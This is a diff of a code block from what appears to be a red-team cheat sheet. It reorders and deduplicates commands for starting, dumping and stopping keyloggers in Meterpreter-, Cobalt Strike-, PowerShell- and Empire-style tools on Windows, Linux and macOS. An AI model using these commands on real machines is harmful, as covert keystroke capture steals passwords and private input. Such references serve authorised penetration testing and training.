@@ -28,28 +28,23 @@
 
 ```
 starting the keylogger:
+keyscan_start
+when you're ready to get the logs:
+keyscan_dump
+when you're done keylogging:
+keyscan_stop
+starting the keylogger:
 keylogger {x86|x64} {pid}
 when you're ready to view logs:
 view -> keylog
 when you're done keylogging:
 jobs
 jobkill {job id number}
-starting the keylogger:
-keyscan_start
-when you're ready to get the logs:
-keyscan_dump
-when you're done keylogging:
-keyscan_stop
 powershell.exe Get-Keystrokes -LogPath C:\key.log
 powershell/collection/USBKeylogger
-powershell/collection/USBKeylogger
-powershell/collection/keylogger
 powershell/collection/keylogger
 python/collection/linux/keylogger
-python/collection/linux/keylogger
 python/collection/linux/xkeylogger
-python/collection/linux/xkeylogger
-python/collection/osx/keylogger
 python/collection/osx/keylogger
 ```
 
